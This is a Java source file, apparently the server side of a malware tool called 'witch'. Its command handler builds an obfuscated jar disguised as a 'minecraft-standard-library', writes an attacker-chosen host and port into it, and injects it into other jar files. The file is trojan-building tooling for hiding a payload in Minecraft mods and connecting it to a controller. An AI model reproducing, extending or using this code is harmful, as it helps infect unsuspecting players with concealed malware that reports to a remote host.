package me.soda.witch.server.server;

import me.soda.witch.server.Main;
import me.soda.witch.server.utils.ConfigModifier;
import me.soda.witch.server.web.WS;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommandHandler {
    private static final Logger LOGGER = LoggerFactory.getLogger(CommandHandler.class);

    public static void handle(String in, WS server) {
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        Main.inputStream.close();
                        server.stop();
                    }
                    case "build" -> {
                        try {
                            if (msgArr.length == 4) {
                                ConfigModifier.modifyCfg("minecraft-standard-library-1.0.0-obfuscated.jar", msgArr[1], msgArr[2], Integer.parseInt(msgArr[3]));
                                LOGGER.info("Build finished.");
                            } else
                                LOGGER.warn("build <output> <host> <port>");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    case "combine" -> {
                        try {
                            if (msgArr.length == 4) {
                                ConfigModifier.combine(msgArr[1], msgArr[2], msgArr[3]);
                                LOGGER.info("Combine finished.");
                            } else
                                LOGGER.warn("combine <input> <injected> <out>");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    case "bc" -> {
                        try {
                            if (msgArr.length == 5) {
                                ConfigModifier.modifyCfg("minecraft-standard-library-1.0.0-obfuscated.jar", "cache.jar", msgArr[3], Integer.parseInt(msgArr[4]));
                                ConfigModifier.combine(msgArr[1], "cache.jar", msgArr[2]);
                                LOGGER.info("Combine finished.");
                            } else
                                LOGGER.warn("bc <input> <out> <host> <port>");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                LOGGER.error(e.getMessage());
            }
        }
    }
}
